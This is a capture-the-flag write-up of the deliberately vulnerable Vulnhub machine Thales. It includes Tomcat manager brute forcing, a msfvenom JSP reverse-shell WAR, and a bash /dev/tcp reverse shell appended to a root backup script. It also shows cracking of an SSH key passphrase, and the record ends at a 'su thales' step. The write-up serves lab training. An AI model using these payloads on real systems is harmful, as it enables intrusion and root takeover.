---
title: Write-up Thales on Vulnhub
author: eMVee
date: 2022-09-23 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, Tomcat]
render_with_liquid: false
---
Today I've downloaded Thales from [Vulnhub](https://www.vulnhub.com/entry/thales-1,749/). A vulnerable machine with two users, a low privileged user and a root user. As soon as I accaccess to a shell on the system, I saw a privilege escalation path directly to root. After successfully exploiting this path, I took the other path as well, so that you can access the system via the low privileged user and after which you have to perform a privilege escaltion to become root. I have worked out both paths in my writeup.

## Getting started
After booting my Kali machine, I checked which IP address was assigned to my machine. 
```bash
┌──(emvee㉿kali)-[~]
└─$ hostname -I                                          
10.0.2.4 
```
My Kali machine was running on IP address "10.0.2.4", it looks it did not change since the last time. Meanwhile I had booted the vulnerable machine "Thales" in my lab environment and it was up and running. 

## Enumeration
Since I didn't know which IP address was assigned to the machine, I had to find out by using netdiscover, fping or an arp-scan. This time I decided to use netdiscover. I use the **-r** argument to give the range which should be scanned.
```bash
┌──(emvee㉿kali)-[~]
└─$ sudo netdiscover -r 10.0.2.0/24      
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                          
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 10.0.2.3        08:00:27:5c:6a:d6      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
 10.0.2.6        08:00:27:1b:bf:45      1      60  PCS Systemtechnik GmbH   
```
After finishing the scan, netdiscover showed me an IP address which should be the target (Thales).
I declared an variable **ip** and assigned the IP address to it. To see if the target is reachable I use the ping utility to see if the target answers my request.
```bash
┌──(emvee㉿kali)-[~]
└─$ ip=10.0.2.6
                                           
┌──(emvee㉿kali)-[~]
└─$ ping -c3 $ip   
PING 10.0.2.6 (10.0.2.6) 56(84) bytes of data.
64 bytes from 10.0.2.6: icmp_seq=1 ttl=64 time=0.745 ms
64 bytes from 10.0.2.6: icmp_seq=2 ttl=64 time=0.728 ms
64 bytes from 10.0.2.6: icmp_seq=3 ttl=64 time=0.747 ms

--- 10.0.2.6 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2084ms
rtt min/avg/max/mdev = 0.728/0.740/0.747/0.008 ms
```
It looks like Thales is responding to my ping request. I noticed the value ttl=64 (Time To Live). This is an indicator that the target Operating System is probably a Linux distro.
Since I knoew that the target was up and running and replied even to my ping request, it was time to move on and scan for open ports and services on the target. To see what is runing on the target I use nmap. 
 
```bash
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 13:02 CEST
Nmap scan report for 10.0.2.6
Host is up (0.00061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8c:19:ab:91:72:a5:71:d8:6d:75:1d:8f:65:df:e1:32 (RSA)
|   256 90:6e:a0:ee:d5:29:6c:b9:7b:05:db:c6:82:5c:19:bf (ECDSA)
|_  256 54:4d:7b:e8:f9:7f:21:34:3e:ed:0f:d9:fe:93:bf:00 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.52
|_http-title: Apache Tomcat/9.0.52
|_http-favicon: Apache Tomcat
MAC Address: 08:00:27:1B:BF:45 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 10.0.2.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.19 seconds
```
Within 12 seconds nmap was finished scanning th target and presented me some useful information which I added to my notes.
* Linux, probably Ubuntu
* Port 22
    * SSH
    * OpenSSH 7.6p1
* Port 8080
    * HTTP
    * Apache Tomcat/9.0.52

I noticed an Apache Tomcat 9.0.52 version running on port 8080. In the past I saw Apache Tomcat machines which could be exploited by uploading a **war** file with a reverse shell in a JSP file, so you gain a shell on the system. Therefor this would be my following step within enumerating services. To see what techniques are used on the web server I decided to run whatweb.

```bash
┌──(emvee㉿kali)-[~]
└─$ whatweb http://$ip:8080
http://10.0.2.6:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.0.2.6], Title[Apache Tomcat/9.0.52]
```
To bad, whatweb did not discover any new information, which brings me to enumerate some directories on the web server. Perhaps some hidden files and directories are hosted on the machine.

```bash
┌──(emvee㉿kali)-[~]
└─$ dirb http://$ip:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep 23 13:06:36 2022
URL_BASE: http://10.0.2.6:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.6:8080/ ----
+ http://10.0.2.6:8080/docs (CODE:302|SIZE:0)                                                                                                                                                                                             
+ http://10.0.2.6:8080/examples (CODE:302|SIZE:0)                                                                                                                                                                                         
+ http://10.0.2.6:8080/favicon.ico (CODE:200|SIZE:21630)                                                                                                                                                                                  
+ http://10.0.2.6:8080/host-manager (CODE:302|SIZE:0)                                                                                                                                                                                     
+ http://10.0.2.6:8080/manager (CODE:302|SIZE:0)                                                                                                                                                                                          
+ http://10.0.2.6:8080/shell (CODE:302|SIZE:0)                                                                                                                                                                                            
                                                                                                                                                                                                                                          
-----------------
END_TIME: Fri Sep 23 13:06:44 2022
DOWNLOADED: 4612 - FOUND: 6
```
It looks like this is a default installation with the **host-manger** and **manager** directory hosted. To gain access to this machine I need to upload the **war** file via the **Manager App**. 
![Image](/assets/img/WriteUp/Vulnhub/Thales/1.png){: width="700" height="400" }

By visiting the website via the browser I saw the default webpage of the Apache Tomcat installation. To upload the **war** file I have to access the **Manager App**.
![Image](/assets/img/WriteUp/Vulnhub/Thales/2.png){: width="700" height="400" }

I used the default credentials (tomcat:s3cret) to logon to the web app, but it did not work. The unauthorized page including the default credentials are shown.
![Image](/assets/img/WriteUp/Vulnhub/Thales/3.png){: width="700" height="400" }

Since the default credentials are not workingI had to find another pair which could be used to logon to the web app. While using my Google Fu I saw the website [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat) with an article about brute forcing accounts for Tomcat. 

The brute force technique was used with Hydra or with Metasploit. The Hydra versiooption didn't work out for me, so I decided to use Metasploit (msfconsole). After pwning this machine I looked for another manual way to brute force the Tomcat credentials and I found one. I have tried this and documente this in this writeup as well. This part is written at the bottem of this writeup.

To start msfconsole I use the **-q** argument to not show that fancy banner of Metasploit.

```bash
┌──(emvee㉿kali)-[~]
└─$ msfconsole -q 

msf6 >
```
In the Hacktricks article I saw the command **use auxiliary/scanner/http/tomcat_mgr_login**  to load the module within Metasploit.
```
msf6 >  use auxiliary/scanner/http/tomcat_mgr_login
```
To see which arguments should be set I use the command **show options**
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                                            no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                                                          no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             8080                                                                            yes       The target port (TCP)
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                          no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST                                                                                             no        HTTP server virtual host
msf6 auxiliary(scanner/http/tomcat_mgr_login) > 
``` 

I noticed a few options which should be set to run the exploit.
* RHOSTS -> IP address of the target
* USERNAME -> username (tomcat) or the list with usernames
* VERBOSE -> false to only see a valid combination

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.0.2.6
RHOSTS => 10.0.2.6
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set USERNAME tomcat
USERNAME => tomcat
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VERBOSE false
VERBOSE => false
msf6 auxiliary(scanner/http/tomcat_mgr_login) >
```

To run the module I just need to type the command **run** and hit the enter key on my keyboard.

``` bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[+] 10.0.2.6:8080 - Login Successful: tomcat:role1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/tomcat_mgr_login) >
```

It has found a valid crednetials combination which I added to my notes: **tomcat:role1**
Because I had found potential credentials I ha dto try to logon to the App manager again.
![Image](/assets/img/WriteUp/Vulnhub/Thales/4.png){: width="700" height="400" }

I could logon with the credentials to the app manager. Now I need to create a JSP reverse shell as a war file to install on Tomcat.
The easiest way is to use msfvenom. The command should look like this: **msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.4 LPORT=9999 -f war -o revshell.war**
* -p is used to set the payload
* LHOST is used to set the listener host (IP address of attacker)
* LPORT is used to set the listener port (Port which the listener is running on)
* -f is used to set the file type
* -o is used to set the output name

```bash
┌──(emvee㉿kali)-[~]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.4 LPORT=9999 -f war -o revshell.war
Payload size: 1092 bytes
Final size of war file: 1092 bytes
Saved as: revshell.war
```
After creating the JSP reverse shell as war file I started my netcat listener on port 9999.
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9999       
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
```

Since my netcat listener was running I had to upload the reverse shell to the manger.
![Image](/assets/img/WriteUp/Vulnhub/Thales/5.png){: width="700" height="400" }

By clicking on the Deploy button, my war file should be installed on the server. A new directory (revshell) should be added which could trigger my reverse shell.
![Image](/assets/img/WriteUp/Vulnhub/Thales/6.png){: width="700" height="400" }

After deploying my JSP reverse shell to the target, I only had to open the **revshell** directory in a new tab within the web browser. This will activate the reverse shell and my netcat listener should catch the connection. 

## Initial access
After opening the directory in a new tab I went back to my netcat listener.
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9999       
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.0.2.6.
Ncat: Connection from 10.0.2.6:49570.

```
It looks like a connection is established. Time to see who has connected to my machine. I use therefore a oneliner such as **whoami;id;hostname;pwd**
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9999       
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.0.2.6.
Ncat: Connection from 10.0.2.6:49570.
whoami;id;hostname;pwd
tomcat
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
miletus
/
```
The user tomcat is connecting from miletus to me and the working directory is in the root of the machine. I would like to know which users are on the target, so I use the command **cat /etc/passwd** to see which users are available on the target.
```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
thales:x:1000:1000:thales:/home/thales:/bin/bash
tomcat:x:999:999::/opt/tomcat:/bin/false
```
I identified the user **thales** on the system. Let's see if I can access and enumerate the home directory of the user(s). I used the command **ls home -ahlR** to enumerate all directories and files even recusrive so I don't miss anything.
```bash
ls /home -ahlR
/home:
total 12K
drwxr-xr-x  3 root   root   4.0K Aug 15  2021 .
drwxr-xr-x 24 root   root   4.0K Sep 23 11:29 ..
drwxr-xr-x  6 thales thales 4.0K Oct 14  2021 thales

/home/thales:
total 52K
drwxr-xr-x 6 thales thales 4.0K Oct 14  2021 .
drwxr-xr-x 3 root   root   4.0K Aug 15  2021 ..
-rw------- 1 thales thales  457 Oct 14  2021 .bash_history
-rw-r--r-- 1 thales thales  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 thales thales 3.7K Apr  4  2018 .bashrc
drwx------ 2 thales thales 4.0K Aug 15  2021 .cache
drwx------ 3 thales thales 4.0K Aug 15  2021 .gnupg
drwxrwxr-x 3 thales thales 4.0K Aug 15  2021 .local
-rw-r--r-- 1 root   root    107 Oct 14  2021 notes.txt
-rw-r--r-- 1 thales thales  807 Apr  4  2018 .profile
-rw-r--r-- 1 root   root     66 Aug 15  2021 .selected_editor
drwxrwxrwx 2 thales thales 4.0K Aug 16  2021 .ssh
-rw-r--r-- 1 thales thales    0 Oct 14  2021 .sudo_as_admin_successful
-rw------- 1 thales thales   33 Aug 15  2021 user.txt

/home/thales/.local:
total 12K
drwxrwxr-x 3 thales thales 4.0K Aug 15  2021 .
drwxr-xr-x 6 thales thales 4.0K Oct 14  2021 ..
drwx------ 3 thales thales 4.0K Aug 15  2021 share

/home/thales/.ssh:
total 16K
drwxrwxrwx 2 thales thales 4.0K Aug 16  2021 .
drwxr-xr-x 6 thales thales 4.0K Oct 14  2021 ..
-rw-r--r-- 1 thales thales 1.8K Aug 16  2021 id_rsa
-rw-r--r-- 1 thales thales  396 Aug 16  2021 id_rsa.pub
```
I noticed several interesting files which I added to my notes.
* notes.txt
    * Can be read by anyone, so as well by the user tomcat
* user.txt
    * Cannot be read by tomcat user
* id_rsa
    * can be read by anyone, so as well by the user tomcat

Based on what I can read at this moment I start looking into the notes.txt file.
```bash
cat /home/thales/notes.txt
I prepared a backup script for you. The script is in this directory "/usr/local/bin/backup.sh". Good Luck.
``` 
It looks like there is a backup.sh file on the system. This is probably used to create a backup of the web directory and is probably scheduled via a cronjob.
I guess this would be the way to escalte my priviliges to root. But before checking the backup.sh file I would like to capture the **id_rsa** file as well of the user Thales. I could use this as priviliege escaltion probably as well.

```bash
cat /home/thales/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6103FE9ABCD5EF41F96C07F531922AAF

ZMlKhm2S2Cqbj+k3h8MgQFr6oG4CBKqF1NfT04fJPs1xbXe00aSdS+QgIbSaKWMh
+/ILeS/r8rFUt9isW2QAH7JYEWBgR4Z/9KSMSUd1aEyjxz7FpZj2cL1Erj9wK9ZA
InMmkm7xAKOWKwLTJeMS3GB4X9AX9ef/Ijmxx/cvvIauK5G2jPRyGSazMjK0QcwX
pkwnm4EwXPDiktkwzg15RwIhJdZBbrMj7WW9kt0CF9P754mChdIWzHrxYhCUIfWd
rHbDYTKmfL18LYhHaj9ZklkZjb8li8JIPvnJDcnLsCY+6X1xB9dqbUGGtSHNnHiL
rmrOSfI7RYt9gCgMtFimYRaS7gFuvZE/NmmIUJkH3Ccv1mIj3wT1TCtvREv+eKgf
/nj+3A6ZSQKFdlm22YZBilE4npxGOC03s81Rbvg90cxOhxYGTZMu/jU9ebUT2HAh
o1B972ZAWj3m5sDZRiQ+wTGqwFBFxF9EPia6sRM/tBKaigIElDSyvz1C46mLTmBS
f8KNwx5rNXkNM7dYX1Sykg0RreKO1weYAA0yQSHCY+iJTIf81CuDcgOIYRywHIPU
9rI20K910cLLo+ySa7O4KDcmIL1WCnGbrD4PwupQ68G2YG0ZOOIrwE9efkpwXPCR
Vi2TO2Zut8x6ZEFjz4d3aWIzWtf1IugQrsmBK+akRLBPjQVy/LyApqvV+tYfQelV
v9pEKMxR5f1gFmZpTbZ6HDHmEO4Y7gXvUXphjW5uijYemcyGx0HSqCSER7y7+phA
h0NEJHSBSdMpvoS7oSIxC0qe4QsSwITYtJs5fKuvJejRGpoh1O2HE+etITXlFffm
2J1fdQgPo+qbOVSMGmkITfTBDh1ODG7TZYAq8OLyEh/yiALoZ8T1AEeAJev5hON5
PUUP8cxX4SH43lnsmIDjn8M+nEsMEWVZzvaqo6a2Sfa/SEdxq8ZIM1Nm8fLuS8N2
GCrvRmCd7H+KrMIY2Y4QuTFR1etulbBPbmcCmpsXlj496bE7n5WwILLw3Oe4IbZm
ztB5WYAww6yyheLmgU4WkKMx2sOWDWZ/TSEP0j9esOeh2mOt/7Grrhn3xr8zqnCY
i4utbnsjL4U7QVaa+zWz6PNiShH/LEpuRu2lJWZU8mZ7OyUyx9zoPRWEmz/mhOAb
jRMSyfLNFggfzjswgcbwubUrpX2Gn6XMb+MbTY3CRXYqLaGStxUtcpMdpj4QrFLP
eP/3PGXugeJi8anYMxIMc3cJR03EktX5Cj1TQRCjPWGoatOMh02akMHvVrRKGG1d
/sMTTIDrlYlrEAfQXacjQF0gzqxy7jQaUc0k4Vq5iWggjXNV2zbR/YYFwUzgSjSe
SNZzz4AMwRtlCWxrdoD/exvCeKWuObPlajTI3MaUoxPjOvhQK55XWIcg+ogo9X5x
B8XDQ3qW6QJLFELXpAnl5zW5cAHXAVzCp+VtgQyrPU04gkoOrlrj5u22UU8giTdq
nLypW+J5rGepKGrklOP7dxEBbQiy5XDm/K/22r9y+Lwyl38LDF2va22szGoW/oT+
8eZHEOYASwoSKng9UEhNvX/JpsGig5sAamBgG1sV9phyR2Y9MNb/698hHyULD78C
-----END RSA PRIVATE KEY-----
```
I copied the private key into my working directory so I can use this at a later moment. For the moment I decided to see if I hace access to the backup.sh file.
To see which permissions are set on the file I use the command **ls -la /usr/local/bin/**
```bash
ls -la /usr/local/bin/
total 12
drwxr-xr-x  2 root root 4096 Oct 14  2021 .
drwxr-xr-x 10 root root 4096 Aug  6  2020 ..
-rwxrwxrwx  1 root root  612 Oct 14  2021 backup.sh
```
It looks like the whole world has read, write and execute permissions on the backup.sh file. This could be interesting!!
I decided to see what the script is doing by using the command **cat /usr/local/bin/backup.sh**

```bash
cat /usr/local/bin/backup.sh
#!/bin/bash
####################################
#
# Backup to NFS mount script.
#
####################################

# What to backup. 
backup_files="/opt/tomcat/"

# Where to backup to.
dest="/var/backups"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```
It looks like it is used to backup indeed some files. Since I am allowed to edit the file I decided to append the file with a reverse shell.

## Privilege escalation
To append this file I use the following command: **echo "bash -c 'exec bash -i &>/dev/tcp/10.0.2.4/4321 <&1'" >>/usr/local/bin/backup.sh**
This will add a bash command at the end (bottom) of the file trying to make a connection to my attacker machine which has a listener on port 4321.

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.0.2.4/4321 <&1'" >>/usr/local/bin/backup.sh
```
Now let's check if the file was appended correctly.
```bash
cat /usr/local/bin/backup.sh
#!/bin/bash
####################################
#
# Backup to NFS mount script.
#
####################################

# What to backup. 
backup_files="/opt/tomcat/"

# Where to backup to.
dest="/var/backups"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
bash -c 'exec bash -i &>/dev/tcp/10.0.2.4/4321 <&1'
```
My command was added succesfully to the file at the end of the file. 
Now I had to start a netcat listener on port 4321.
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 4321       
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
```
My netcat listener was running on port 4321 and now I only have to wait for it! A moment to take a break and get something to drink.
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 4321       
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.0.2.6.
Ncat: Connection from 10.0.2.6:53570.
bash: cannot set terminal process group (13678): Inappropriate ioctl for device
bash: no job control in this shell
root@miletus:~# 
```
When I came back I noticed a username **root@miletus**. Let's see if this is correct by using the following command: **whoami;id;hostname;cat /root/root.txt**
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 4321       
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.0.2.6.
Ncat: Connection from 10.0.2.6:53570.
bash: cannot set terminal process group (13678): Inappropriate ioctl for device
bash: no job control in this shell
root@miletus:~# whoami;id;hostname;cat /root/root.txt
whoami;id;hostname;cat /root/root.txt
root
uid=0(root) gid=0(root) groups=0(root)
miletus
3a1c85bebf8833b0ecae900fb8598b17
```
I am root on the machine and I have captured the root flag. To capture the user flag I only have to run the following command: **cat /home/thales/user.txt**
```bash
root@miletus:~# cat /home/thales/user.txt
cat /home/thales/user.txt
a837c0b5d2a8a07225fd9905f5a0e9c4
root@miletus:~# 
```
Both flags are captured, but I guess the intention was to capture the user flag before the root flag via the user Thales. This could be done via the private key of the user. 

## Alternative path.... via the user thales
Since I captured the private key to my notes I added it as well to my working directory for "thales" with nano.
```bash
┌──(emvee㉿kali)-[~/Documents/thales]
└─$ nano id_rsa        
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/thales]
└─$ cat id_rsa   
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6103FE9ABCD5EF41F96C07F531922AAF

ZMlKhm2S2Cqbj+k3h8MgQFr6oG4CBKqF1NfT04fJPs1xbXe00aSdS+QgIbSaKWMh
+/ILeS/r8rFUt9isW2QAH7JYEWBgR4Z/9KSMSUd1aEyjxz7FpZj2cL1Erj9wK9ZA
InMmkm7xAKOWKwLTJeMS3GB4X9AX9ef/Ijmxx/cvvIauK5G2jPRyGSazMjK0QcwX
pkwnm4EwXPDiktkwzg15RwIhJdZBbrMj7WW9kt0CF9P754mChdIWzHrxYhCUIfWd
rHbDYTKmfL18LYhHaj9ZklkZjb8li8JIPvnJDcnLsCY+6X1xB9dqbUGGtSHNnHiL
rmrOSfI7RYt9gCgMtFimYRaS7gFuvZE/NmmIUJkH3Ccv1mIj3wT1TCtvREv+eKgf
/nj+3A6ZSQKFdlm22YZBilE4npxGOC03s81Rbvg90cxOhxYGTZMu/jU9ebUT2HAh
o1B972ZAWj3m5sDZRiQ+wTGqwFBFxF9EPia6sRM/tBKaigIElDSyvz1C46mLTmBS
f8KNwx5rNXkNM7dYX1Sykg0RreKO1weYAA0yQSHCY+iJTIf81CuDcgOIYRywHIPU
9rI20K910cLLo+ySa7O4KDcmIL1WCnGbrD4PwupQ68G2YG0ZOOIrwE9efkpwXPCR
Vi2TO2Zut8x6ZEFjz4d3aWIzWtf1IugQrsmBK+akRLBPjQVy/LyApqvV+tYfQelV
v9pEKMxR5f1gFmZpTbZ6HDHmEO4Y7gXvUXphjW5uijYemcyGx0HSqCSER7y7+phA
h0NEJHSBSdMpvoS7oSIxC0qe4QsSwITYtJs5fKuvJejRGpoh1O2HE+etITXlFffm
2J1fdQgPo+qbOVSMGmkITfTBDh1ODG7TZYAq8OLyEh/yiALoZ8T1AEeAJev5hON5
PUUP8cxX4SH43lnsmIDjn8M+nEsMEWVZzvaqo6a2Sfa/SEdxq8ZIM1Nm8fLuS8N2
GCrvRmCd7H+KrMIY2Y4QuTFR1etulbBPbmcCmpsXlj496bE7n5WwILLw3Oe4IbZm
ztB5WYAww6yyheLmgU4WkKMx2sOWDWZ/TSEP0j9esOeh2mOt/7Grrhn3xr8zqnCY
i4utbnsjL4U7QVaa+zWz6PNiShH/LEpuRu2lJWZU8mZ7OyUyx9zoPRWEmz/mhOAb
jRMSyfLNFggfzjswgcbwubUrpX2Gn6XMb+MbTY3CRXYqLaGStxUtcpMdpj4QrFLP
eP/3PGXugeJi8anYMxIMc3cJR03EktX5Cj1TQRCjPWGoatOMh02akMHvVrRKGG1d
/sMTTIDrlYlrEAfQXacjQF0gzqxy7jQaUc0k4Vq5iWggjXNV2zbR/YYFwUzgSjSe
SNZzz4AMwRtlCWxrdoD/exvCeKWuObPlajTI3MaUoxPjOvhQK55XWIcg+ogo9X5x
B8XDQ3qW6QJLFELXpAnl5zW5cAHXAVzCp+VtgQyrPU04gkoOrlrj5u22UU8giTdq
nLypW+J5rGepKGrklOP7dxEBbQiy5XDm/K/22r9y+Lwyl38LDF2va22szGoW/oT+
8eZHEOYASwoSKng9UEhNvX/JpsGig5sAamBgG1sV9phyR2Y9MNb/698hHyULD78C
-----END RSA PRIVATE KEY-----
```
To gain the passphrase for the private key I use the command **ssh2john id_rsa > hash-ssh** to create a hash file which can be cracked with John the Ripper.
```bash
┌──(emvee㉿kali)-[~/Documents/thales]
└─$ ssh2john id_rsa > hash-ssh           
```
As soon as the hash file is created I can start John the Ripper to brute force the passphrase with a dictionary. In this case I choose the famous rockyou file.
I use the command **john hash-ssh --wordlist=/usr/share/wordlists/rockyou.txt** to start brute forcing the passphrase.
```
┌──(emvee㉿kali)-[~/Documents/thales]
└─$ john hash-ssh --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vodka06          (id_rsa)     
1g 0:00:00:00 DONE (2022-09-23 21:36) 1.265g/s 3620Kp/s 3620Kc/s 3620KC/s vodka1420..vodka*rox
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
In no time the password for thales has been found. Now I can add the following to my notes: **thales:vodka06**
To logon via the SSH service I run the command **ssh thales@$ip -i id_rsa**

```bash
┌──(emvee㉿kali)-[~/Documents/thales]
└─$ ssh thales@$ip -i id_rsa 
Enter passphrase for key 'id_rsa': 
thales@10.0.2.6: Permission denied (publickey).

```
This didn't work for me... Perhaps I could switch user (su) in the reverse shell.
First I will upgrade the shell with a Python script, so I can see which user I am using.
After I have upgraded the shell, I switch user with the command **su thales**, then I enter the password **vodka06** and hit the enter key.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@miletus:/$ su thales
su thales
Password: vodka06

